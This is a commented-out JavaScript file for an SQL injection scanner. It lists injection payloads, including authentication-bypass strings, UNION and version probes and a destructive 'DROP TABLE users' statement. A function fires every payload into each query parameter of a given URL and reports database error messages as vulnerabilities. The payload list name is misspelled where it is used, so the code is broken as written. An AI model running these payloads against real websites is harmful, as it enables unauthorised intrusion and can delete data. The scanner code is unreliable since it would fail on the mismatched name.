// const sqlpayloadList = [
//     `' OR '1'='1`,
//     `" OR "1"="1`,
//     `' OR '1'='1' --`,
//     `" OR "1"="1" --`,
//     `admin' --`,
//     `' OR 1=1 --`,
//     `1' or '1' = '1`,
//     `') OR ('1'='1`,
//     `1; DROP TABLE users --`,
//     `1; SELECT * FROM information_schema.tables --`,
//     `' OR 'x'='x`,
//     `") OR ("x"="x`,
//     `' UNION SELECT NULL, NULL, NULL --`,
//     `' AND 1=CONVERT(int, (SELECT @@version)) --`,
//     `' AND (SELECT COUNT(*) FROM users) > 0 --`,
//     `' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --`
//   ];
  
// export async function checkSQLInjection(url) {
//     const parsedUrl = new URL(url);
//     const params = parsedUrl.searchParams;
//     let vuln = false;
//     let theresult = [];
//     for (const [key, value] of params) {
//       for (const payload of sqlpayloadlist) {
//         const testUrl = `${parsedUrl.origin}${parsedUrl.pathname}?${key}=${encodeURIComponent(payload)}`;
//         console.log(`Testing: ${testUrl}`);
//         try {
//           const response = await fetch(testUrl);
//           const responsetext = await response.text();
//           if (
//                             responsetext.includes("SQL syntax") ||
//                             responsetext.includes("Unclosed quotation mark") ||
//                             responsetext.includes("Unknown column") ||
//                             responsetext.includes("mysql_fetch") ||
//                             responsetext.includes("You have an error in your SQL syntax") ||
//                             responsetext.includes("Warning: mysql") ||
//                             responsetext.includes("ODBC SQL Server Driver") ||
//                             responsetext.match(/column .* does not exist/i)||
//                             responsetext.includes("SQL syntax error") || 
//                             responsetext.includes("unclosed quotation mark") || 
//                             responsetext.includes("database error") ||
//                             responsetext.includes("unexpected end of SQL command") ||
//                             responsetext.includes("unterminated quoted string") ||
//                             responsetext.includes("error in your SQL syntax") ||
//                             responsetext.includes("Warning: mysql_") ||
//                             responsetext.includes("You have an error in your SQL syntax") ||
//                             responsetext.includes("PG::SyntaxError") || 
//                             responsetext.includes("ERROR: syntax error") || 
//                             responsetext.includes("ERROR: unterminated quoted string") ||
//                             responsetext.includes("PostgreSQL query failed") ||
//                             responsetext.includes("Microsoft SQL Native Client error") ||
//                             responsetext.includes("ODBC SQL Server Driver") ||
//                             responsetext.includes("Incorrect syntax near") ||
//                             responsetext.includes("Unclosed quotation mark after the character string") ||
//                             responsetext.includes("ORA-00933: SQL command not properly ended") ||
//                             responsetext.includes("ORA-00904: invalid identifier") ||
//                             responsetext.includes("SQLite3::SQLException") ||
//                             responsetext.includes("no such column") ||
//                             responsetext.includes("syntax error near") ||
//                             responsetext.includes("MariaDB server version for the right syntax to use") ||
//                             responsetext.includes("View '...' references invalid table(s) or column(s)") ||
//                             responsetext.includes("Fatal error: Uncaught exception") || 
//                             responsetext.includes("Warning: pg_query()") || 
//                             responsetext.includes("Invalid SQL statement")
//           ) {
//             vuln = true;
//             theresult.push({
//               parameter: key,
//               payload,
//               response: "SQL error detected"
//             });
//             break;
//           }
//         } catch (err) {
//           console.error(`Error testing ${testUrl}:`, err);
//         }
//       }
//     }
//     return {
//       isVulnerable: vuln,
//       report: theresult
//     };
//   }